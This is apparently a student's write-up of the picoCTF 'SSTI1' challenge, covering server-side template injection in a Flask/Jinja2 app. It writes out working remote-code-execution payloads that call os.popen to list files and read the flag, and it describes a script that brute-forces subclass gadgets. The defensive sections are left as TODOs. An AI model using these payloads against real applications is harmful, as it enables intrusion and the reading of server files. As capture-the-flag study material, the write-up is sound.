# SSTI1
> picoCTF
> <Web Exploitation>
>
> ***I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website here***
>
> #### Hints: 
> "Server Side Template Injection "

> TODO: upload screenshots

## Initial Thoughts:

- I don't know much about Server Side Template Injection at this time to take advantage of the hint, so I'll start my investigation with learning the basics of it. 

## Info Gathering:
	
	- Ctrl + U gives source code, nothing stands out other than "Announcements may only reach yourself"
	- {{ }} Allows operation input; Tested via math equations
		- Confirmed to be Jinja2 based via config.items and 7*'7'
	- {{ self.__init__.__globals__.__builtins__ }} reveals the following
	- {{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name "*flag*" 2>/dev/null').read() }} reveals multiple files with 'flag'
		- One pops out in /challenge/flag
	- Using {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /path/to/file.txt').read() }} will read out a specific text file

## Solution:

### Solution 1 (Initial Attempt)
1. Access website and test announcement field to see output 
2. Follow payload tests to test for server side template injection vulnerability and uncover template engine (${7*7} -> {{7*7}} -> {{7*'7'}} -> Jinja2)
3. Submit following payload to locate flag {{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name "*flag*" 2>/dev/null').read() }} -> file labeled /challenge/flag found
4. Submit following payload -> {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read() }}
5. Flag obtained -> academy{REDACTED}

### Solution 2 (After Researching Methods)
1. Access website and test announcement field to see output 
2. Follow payload tests to test for server side template injection vulnerability and uncover template engine (${7*7} -> {{7*7}} -> {{7*'7'}} -> Jinja2)
3. {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }} -> Shows the files on the server
4. {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
5. Flag obtained -> academy{REDACTED}

## Notes:
Though I found the flag, it didn't feel like a smooth process. I did learn through the references about ways to identify template engines using mathematical operations followed by payload examples from references
- Will attempt again after reviewing other solutions to the CTF
- found the following [walkthrough](https://www.youtube.com/watch?v=oVBkaSHj4aE)

  - used curl -I [insert-instance-URL] to get server information which used Python, narrowing the template engine to Flask and Jinja2 
  - used {{7*7}} to test for code rendering -> gave 49 letting us know input doesn't get validated or sanitized
  - cannot use 'import' due to template limitations

    - must use Python 'gadgets'
		- created a Python script to deliver payload based on previous information and the following payload -> "{{\"\".__class__.__base__.__subclasses__()}}"

      - uses import requests, import html, and import re

        1. The script starts by posting the payload to see if status code 200 is received in the API call ->
        2. If 200 received, text found by payload will be added to a text variable, then classes will be appended from text variable into a list of strings ->
        3. after list of strings is created, script will iterate over the list and generate a new payload as follows "{{\"\".__class__.__base__.__subclasses__()["+ str(i)  +"].__init__.globals__['sys'].modules['os'].popen('cat flag'.read()}}" where i is an index ->
        4. the post will run through class indexes to print out the flag, printing first the number of classes to iterate over, then go through the classes to read out the flag
    
			- The script also includes print commands to print out not only the .text for the read of the payload if the new payload gets status code 200, but also separates a section to debug by printing the class name of the iteration that successfully located a flag along with the index number of said class			
			- Python gadgets: "a chain of classes and methods modules" 
			
	- References:
		- https://tcm-sec.com/find-and-exploit-server-side-template-injection-ssti/
		- https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html
		- https://securelayer7.net/learn/application-security/jinja2-template-injection
    
## Review:

### Vulnerabilities Uncovered:
> TODO: complete

1. Site allows unchecked input, allowing for injection attacks
2. No errors triggered for multiple inputs in short period or no session revocation after such behavior
3. 


### How To Detect:
> TODO: complete

### How To Prevent:
> TODO: complete
